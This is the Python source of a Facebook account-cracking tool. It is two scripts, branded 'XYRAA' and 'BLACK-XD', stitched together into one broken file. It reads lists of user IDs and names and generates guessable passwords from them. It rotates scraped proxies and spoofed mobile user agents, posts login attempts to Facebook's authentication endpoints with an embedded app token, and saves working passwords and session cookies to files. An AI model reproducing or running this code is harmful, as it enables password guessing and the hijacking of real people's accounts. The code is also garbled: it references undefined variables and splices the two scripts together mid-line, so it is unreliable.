#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#________________LOOP______________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#________________COLOUR______________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________LINE____________#
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#
def sex():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbcr = random.choice(['Jio', 'Vi india', 'Airtel', 'Jio 5G', 'Airtel'])
	fblc = random.choice(["en-in","pt-BR","ru-ru","en-gb","en-us","zh-cn","zh-tw","en-US","es-mx"])
	fbbd = 'Realme'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Xiaomi'
	build = random.choice(["RMX3785","OPPO17PRO","OPPO A5","RMX3720","TP1A.05.001","LRX21M","RP1A.200720.011","RKQ1.211119.001","PKQ1.190714.001","UP1A.231005.007","QP1A.190711.020","PPR1.180610.011","SP1A.210812.016","TP1A.220905.001","LMY47V","QKQ1.200614.002","COS76I","RRL95K","MRA58K","LMY47I","XAM72A","LXY88Z","MXH54S","UNS97S","TAT94S","SWD86W","RGK58F","YBM98Y","N6F26Q","O11019","JLS36C","JWR66Y","GRK39F","SKYW1908301CN00MP6","GRI40","MBFMIEK","KASE2208050OS00MP4","NJH47F","N2G47H"])
	fbdv = random.choice(["Realme 11X","Realme","Realme 11X 5G","Realme Narzo","Black Shark 2Pro","M2010J19SY","M2007J1SC","Redmi K20 Pro","Realme Nazro","Note 16 Pro","2311DRK48C","2207122MC","Redmi 10 5G","2201123G","MI NOTE LTE","Mi 11 LE","23028RN4DG","K60E","QIN3ULTRA","21091116UI","Redmi 10I","M2004J7AC","HM 1S","Redmi 5 pro,","Redmi 5Plus","Redmi 85781","2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua 
    
#__________________LOGO____________#
logo=(f"""   
   ____               _  _____  _ __       
  / __/__  ___  __ __| |/_/ _ \(_) /  __ __
 _\ \/ _ \/ _ \/ // />  </ ___/ / _ \/ // /
/___/\___/_//_/\_,_/_/|_/_/  /_/_//_/\_,_/ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{A} XYRAA 
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{A} FILE 
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢ 0.0
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PAID
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONE ')
    
   
    linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
    elif sex in ['3']:
        os.system('clear');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()

#__________________FILE DEF____________#
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A} NINJA.txt');linex()
    file = input(f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time.sleep(1)
        file()
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))
    clear()
    for x in range(limit):
        print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{x+1}{G1}]{G1} {A}➢{S} '));linex()
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {tl}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            sexy.submit(M1,ids,names,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()

#__________________FILE METHOD____________#
def M1(ids,names,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks5://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}SONU-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua_starting = f"[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))+";FBBV/"+str(random.randint(000000000,999999999))+"';[FBAN/FB4A;FBAV/509.0.0.33526;FBBV/374546759;FBDM/{density=1.5,838=480,height=1749};FBLC/en_US;FBRV/374546759;FBCR/IndosatOoredoo;FBCR/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Realme RMX3785;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',    
    'dpr': '1.7000000476837158',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH1933"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': sex(),
    'viewport-width': '980',
}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}XYRA-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/AHMAD-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                ok+=1
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}XYRA-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/NINJA-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    menu()xd=f"{G}●{W}";xd1=f"{G}● {W}1";xd2=f"{G}● {W}2";xd3=f"{G}● {W}3";xd4=f"{G}● {W}4";xd5=f"{G}● {W}5";xd6=f"{G}● {W}6";xd0=f"{G}● {W}0";xdx=f"{G}● {W}?";xdxx=f"{G}:{W}"
#---------------------● CLEAR ●---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{G}──────────────────────────────────────────────────')
#---------------------● LOGO ●---------------------#
logo=(f"""
   {W} ______         _______ _______ _     _
   {G} |_____] |      |_____| |       |____/ 
   {W} |_____] |_____ |     | |_____  |    \_ 0.0
{G}──────────────────────────────────────────────────
   {W}OWNER {G}:{W} BLACK-XD {G}|{W} TOOLS {G}:{W} FILE{G}|{W}RANDOM CLONE
{G}──────────────────────────────────────────────────""")
#---------------------● MAIN MENU ●---------------------#
def ___black___():
	clear();print(f"{xd1} START FILE CLONE ");print(f"{xd0} EXISTING CLONE ");linex();option = input(f"{xdx} SELECT {xdxx} ")
	if option in ["1"]:___filex___()
	if option in ["0"]:exit()
	else:linex();print(f"{xd} OPTION NOT FOUND ");linex();time.sleep(1);print(f"{xd} TRY AGAIN BROTHER");time.sleep(1);___black___()
#---------------------● FILEX ●---------------------#
def ___filex___():
	clear();print(f"{xd} EXAMPLE {xdxx} /sdcard/black.txt");linex();file = input(f"{xdx} ENTER FILE NAME {xdxx} ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		linex();print(f'{xd} FILE LOCATION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN BROTHER");time.sleep(1);___filex___()
	clear();print(f"{xd1} METHOD {O}>{G}>{W}M1{G}<{O}<");print(f"{xd2} METHOD {O}>{G}>{W}M2{G}<{O}<");print(f"{xd3} METHOD {O}>{G}>{W}M3{G}<{O}<");linex();methd = input(f"{xdx} SELECT {xdxx} ")
	clear();print(f'{xd} PASSWORD SYSTEM ');linex();print(f'{xd1} AUTO PASSWORD CLONE ONLY BD');print(f'{xd2} CHOICE PASSWORD CLONE');linex();ppp = input(f"{xdx} SELECT {xdxx} ")
	if ppp in ['1','01']:plist.append('first12');plist.append('first123');plist.append('first1234');plist.append('first12345');plist.append('first123456');plist.append('last01');plist.append('last02');plist.append('last11');plist.append('last22');plist.append('kamu nanya');plist.append('last');plist.append('first')
	else:
		try:
			clear();print(f"{xd} EXAMPLE {xdxx} BANGLADESH 5-30 {O}|{W} OTHERS 5-10");linex()
			ps_limit = int(input(f'{xdx} PASSWORDS LIMIT {xdxx} '))
		except:
			ps_limit = 5
		clear();print(f"{xd} EXAMPLE {xdxx} firstlast {G}|{W} first12 {G}|{W} first123 ");linex()
		for i in range(ps_limit):
			plist.append(input(f'{xd} PASSWORD NO{i+1} {xdxx}{G} '))
	with tred(max_workers=30) as __xxx___:
		clear();total_ids = str(len(fo))
		print(f'{xd} TOTAL FILE UID {xdxx}{G} {total_ids} ');print(f"{xd} IF NO RESULT ON{G}|{W}OFF AIRPLANE MODE");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd in ['1']:__xxx___.submit(___M1___,ids,names,passlist)
			elif methd in ['2']:__xxx___.submit(___M2___,ids,names,passlist)
			elif methd in ['3']:__xxx___.submit(___M3___,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{G}|{W}CP {xdxx} '+str(len(oks))+'|'+str(len(cps)));linex();exit()
#---------------------● FILE METHOD M1 ●---------------------#
def ___M1___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} BLACK-M1 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ua = ua_asep()
                        ua = UserAgentDalvikFban()
                        ___M1X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data={"adid": str(uuid.uuid4()),
                                 "format": "json","device_id": str(uuid.uuid4()),
                                 "cpl": "true","family_device_id": str(uuid.uuid4()),
                                 "credentials_type": "device_based_login_password",
                                 "error_detail_type": "button_with_disabled",
                                 "source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "id_ID","client_country_code": "ID","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com",
                                  "User-Agent": ___M1X___,
                                  "X-FB-Net-HNI": "45204",
                                  "X-FB-SIM-HNI": "45201",
                                  "X-FB-Connection-Type": "MOBILE.LTE",
                                  "X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● BLACK-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/BLACK-M1-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{G}●{R} BLACK-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-M1-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M2 ●---------------------#
def ___M2___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} BLACK-M2 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        #___M2X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/Orca-Android;FBAV/360.0.0.74.642;FBPN/com.facebook.orca;FBLC/ar_EG;FBBV/493469136;FBCR/Rakuten;FBMF/samsung;FBBD/samsung;FBDV/SM-A705F;FBSV/16;FBCA/arm64-v8a:null;FBDM/{density=4,width=2230,height=2578};FB_FW/1;] FBBK/1'
                        data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),
                                   "email": ids,"password": pas,
                                   "generate_analytics_claims": "1",
                                   "credentials_type": "password",
                                   "source": "login","error_detail_type": "button_with_disabled",
                                   "enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive",
                                   "User-Agent": UserAgentDalvikFban(),
                                   "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                   "X-FB-Friendly-Name": "authenticate",
                                   "X-FB-Connection-Type": "MOBILE.LTE",
                                   "Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● BLACK-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/BLACK-M2-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{G}●{R} BLACK-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-M2-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M3 ●---------------------#
def ___M3___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} BLACK-M3 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        #___M3X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/184.0.0.29.122;FBPN/com.facebook.MobileAdsManagerAndroid;FBLC/fr_FR;FBBV/283750661;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2332;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
                        data = {'adid':adid,'format':'json','device_id':device_id,
                                   'email':ids,'password':pas,
                                   'generate_analytics_claims':'1',
                                   'credentials_type':'password',
                                   'source':'login','error_detail_type':'button_with_disabled',
                                   'enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
                        headers={'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate',
                                   'X-FB-Connection-Type':'WIFI',
                                   'User-Agent':UserAgentDalvikFban(),
                                   'Accept-Encoding':'gzip, deflate',
                                   'Content-Type': 'application/x-www-form-urlencoded',
                                   'X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-api.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● BLACK-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/BLACK-M3-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error_msg']:
                                        print(f'\r{G}●{R} BLACK-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-M3-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------> END <---------------------#
___black___()
